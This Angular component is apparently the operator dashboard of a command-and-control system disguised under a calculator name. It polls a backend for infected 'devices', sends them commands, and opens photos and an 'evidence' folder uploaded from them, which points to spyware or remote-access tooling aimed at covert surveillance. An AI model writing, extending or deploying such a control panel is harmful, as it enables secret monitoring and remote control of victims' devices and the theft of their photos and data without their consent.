import { Component, OnInit, OnDestroy } from '@angular/core';
import { CommonModule } from '@angular/common'; // Necesario para *ngFor
import { C2Service } from '../services/c2.service';
import { Device } from '../models/device.model';


import { interval, Subscription } from 'rxjs';

@Component({
  selector: 'app-calculator',
  standalone: true,
  imports: [CommonModule], // Importamos CommonModule aquí
  templateUrl: './calculator.component.html', // Tu HTML del dashboard va aquí
  styleUrl: './calculator.component.css'
})
export class CalculatorComponent implements OnInit, OnDestroy {
  devices: Device[] = [];
  intervalId: any;

  // Inyectamos el servicio
  constructor(private c2Service: C2Service) {}

  ngOnInit() {
    this.loadDevices();
    // Refrescar la tabla cada 3 segundos automáticamente
    this.intervalId = setInterval(() => this.loadDevices(), 3000);
  }

  ngOnDestroy() {
    if (this.intervalId) {
      clearInterval(this.intervalId);
    }
  }

  loadDevices() {
    this.c2Service.getDevices().subscribe({
      next: (data) => {
        this.devices = data;
        console.log('Dispositivos actualizados:', data);
      },
      error: (err) => console.error('Error conectando a .NET:', err)
    });
  }

  sendCommand(deviceId: string, command: string) {
    if(confirm(`¿Enviar orden ${command} a ${deviceId}?`)) {
      this.c2Service.sendCommand(deviceId, command).subscribe({
        next: (res) => alert(`✅ Orden enviada: ${res.message}`),
        error: (err) => alert('❌ Error enviando orden')
      });
    }
  }
  
  // Función auxiliar para ver la foto (abre nueva pestaña)
  viewPhoto(path: string) {
      // .NET devuelve la ruta relativa ej: /uploads/foto.jpg
      // Le pegamos la URL base del servidor
      const fullUrl = `https://localhost:7112${path}`;
      window.open(fullUrl, '_blank');
  }


  // Agrega esto dentro de tu clase:

getOnlineCount(): number {
  return this.devices.filter(d => d.isOnline).length;
}

openEvidenceFolder() {
  // Abre la carpeta de uploads servida por .NET
  window.open('https://localhost:7112/uploads', '_blank');
}
}